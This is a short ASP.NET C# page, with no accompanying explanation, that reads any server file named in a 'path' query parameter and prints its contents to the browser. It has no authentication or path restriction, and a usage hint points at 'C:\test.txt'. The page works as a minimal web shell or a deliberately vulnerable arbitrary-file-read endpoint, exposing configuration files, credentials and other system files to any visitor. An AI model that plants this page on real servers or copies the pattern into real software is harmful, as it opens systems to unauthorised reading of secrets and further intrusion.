
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string filePath = Request.QueryString["path"];

        if (!string.IsNullOrEmpty(filePath))
        {
            try
            {
                if (File.Exists(filePath))
                {
                    string content = File.ReadAllText(filePath);
                    Response.Write("<pre>" + Server.HtmlEncode(content) + "</pre>");
                }
                else
                {
                    Response.Write("File not found.");
                }
            }
            catch (Exception ex)
            {
                Response.Write("Error: " + ex.Message);
            }
        }
        else
        {
            Response.Write("Usage: ?path=C:\\test.txt");
        }
    }
</script>
